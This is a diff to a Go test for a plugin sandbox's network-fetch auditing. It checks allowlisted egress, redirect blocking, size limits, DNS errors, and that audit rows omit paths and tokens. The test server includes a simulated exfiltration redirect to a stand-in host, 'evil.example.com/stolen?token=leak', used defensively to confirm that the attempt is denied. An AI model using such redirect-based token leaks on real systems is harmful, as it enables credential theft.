@@ -408,41 +408,78 @@ func (m mapDNS) LookupIPAddr(_ context.Context, host string) ([]net.IPAddr, erro
 	return nil, &net.DNSError{Err: "no such host", Name: host, IsNotFound: true}
 }
 
-// Every fetch, allowed or denied, writes one audit row with host and port
-// only: no path, no query.
+// Every request of a fetch, allowed, denied or failed, writes one audit row
+// with its own host and port only: no path, no query. So does a fetch the
+// plugin side refuses before any network.
 func TestFetchAudited(t *testing.T) {
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path == "/away" {
-			http.Redirect(w, r, "http://evil.example.com"+r.Host[strings.LastIndexByte(r.Host, ':'):]+"/stolen?token=leak", http.StatusFound)
-			return
+		port := r.Host[strings.LastIndexByte(r.Host, ':'):]
+		switch r.URL.Path {
+		case "/away":
+			http.Redirect(w, r, "http://evil.example.com"+port+"/stolen?token=leak", http.StatusFound)
+		case "/hop":
+			http.Redirect(w, r, "http://other.example.com"+port+"/landed?token=leak", http.StatusFound)
+		default:
+			fmt.Fprint(w, "ok "+r.UserAgent())
 		}
-		fmt.Fprint(w, "ok "+r.UserAgent())
 	}))
 	t.Cleanup(srv.Close)
 	_, port, _ := net.SplitHostPort(srv.Listener.Addr().String())
-	host := "api.example.com:" + port
+	api, other, evil := "api.example.com:"+port, "other.example.com:"+port, "evil.example.com:"+port
 
 	s := newMailContextService(t)
-	s.pluginNet = plugins.NetOptions{Resolver: mapDNS{"api.example.com": "127.0.0.1", "evil.example.com": "127.0.0.1"},
+	s.pluginNet = plugins.NetOptions{Resolver: mapDNS{"api.example.com": "127.0.0.1", "other.example.com": "127.0.0.1", "evil.example.com": "127.0.0.1"},
 		AllowHTTP: true, AllowLoopback: true}
-	startTestPlugin(t, s, "fetcher", `{"net":["`+host+`"]}`, stashCtx)
-	inv := plugins.Invocation{ID: "call-7", Kind: plugins.KindTool, EgressHosts: []string{host}}
-	got, err := evalPlugin(t, s, "fetcher", inv, `ctx.net.fetch("http://`+host+`/private/path?token=secret").then(r => r.text())`)
+	startTestPlugin(t, s, "fetcher", `{"net":["`+api+`","`+other+`","nodns.example.com"]}`, stashCtx)
+	inv := plugins.Invocation{ID: "call-7", Kind: plugins.KindTool, EgressHosts: []string{api, other, "nodns.example.com"}}
+	fetch := func(args string) (any, error) {
+		return evalPlugin(t, s, "fetcher", inv, `ctx.net.fetch(`+args+`).then(r => r.text())`)
+	}
+	got, err := fetch(`"http://` + api + `/private/path?token=secret"`)
 	require.NoError(t, err)
 	assert.Equal(t, "ok Godwit-Plugin/1.0.0", got)
-	_, err = evalPlugin(t, s, "fetcher", inv, `ctx.net.fetch("http://`+host+`/away?token=secret")`)
-	require.ErrorContains(t, err, "host_not_allowed")
-
-	rows, err := s.db.Query(t.Context(), `SELECT source, extension, tool, call_id, destination, decision, COALESCE(reason, '')
-		FROM audit_log WHERE tool LIKE '%net.fetch' ORDER BY id`)
+	_, err = fetch(`"http://` + api + `/hop?token=secret"`)
 	require.NoError(t, err)
+	_, err = fetch(`"http://` + api + `/away?token=secret"`)
+	require.ErrorContains(t, err, "host_not_allowed")
+	_, err = fetch(`"http://` + evil + `/direct?token=secret"`)
+	require.ErrorContains(t, err, "permission denied: net:"+evil)
+	_, err = fetch(`"http://` + api + `/up", {method: "POST", body: "x".repeat(2 << 20)}`)
+	require.ErrorContains(t, err, "too large")
+	_, err = fetch(`"https://nodns.example.com/x?token=secret"`)
+	require.Error(t, err)
+
+	audit := func() [][]any {
+		rows, err := s.db.Query(t.Context(), `SELECT source, extension, tool, call_id, destination, decision, COALESCE(reason, '')
+			FROM audit_log WHERE tool LIKE '%net.fetch' ORDER BY id`)
+		require.NoError(t, err)
+		return rows.Values
+	}
+	row := func(dest, decision, reason string) []any {
+		return []any{"plugin", "fetcher", "plugin:fetcher:net.fetch", "call-7", dest, decision, reason}
+	}
 	assert.Equal(t, [][]any{
-		{"plugin", "fetcher", "plugin:fetcher:net.fetch", "call-7", host, "allow", ""},
-		{"plugin", "fetcher", "plugin:fetcher:net.fetch", "call-7", host, "deny", "host_not_allowed"},
-	}, rows.Values)
+		row(api, "allow", ""),
+		row(api, "allow", ""), row(other, "allow", ""),
+		row(api, "allow", ""), row(evil, "deny", "host_not_allowed"),
+		row(evil, "deny", "host_not_allowed"),
+		row(api, "deny", "too_large"),
+		row("nodns.example.com:443", "error", "dns_error"),
+	}, audit())
 	all, err := s.db.Query(t.Context(), "SELECT * FROM audit_log")
 	require.NoError(t, err)
-	for _, v := range []string{"/private", "token", "secret", "stolen", "leak", "?"} {
+	for _, v := range []string{"/private", "token", "secret", "stolen", "landed", "leak", "?"} {
 		assert.NotContains(t, fmt.Sprint(all.Values), v)
 	}
+
+	// A refusal whose audit row cannot be written reports both.
+	_, err = s.db.Execute(t.Context(), `CREATE TRIGGER no_deny_audit BEFORE INSERT ON audit_log WHEN NEW.decision = 'deny'
+		BEGIN SELECT RAISE(ABORT, 'audit disk full'); END`)
+	require.NoError(t, err)
+	_, err = fetch(`"http://` + api + `/away"`)
+	require.ErrorContains(t, err, "host_not_allowed")
+	require.ErrorContains(t, err, "audit disk full")
+	_, err = fetch(`"http://` + evil + `/direct"`)
+	require.ErrorContains(t, err, "permission denied")
+	require.ErrorContains(t, err, "audit disk full")
 }
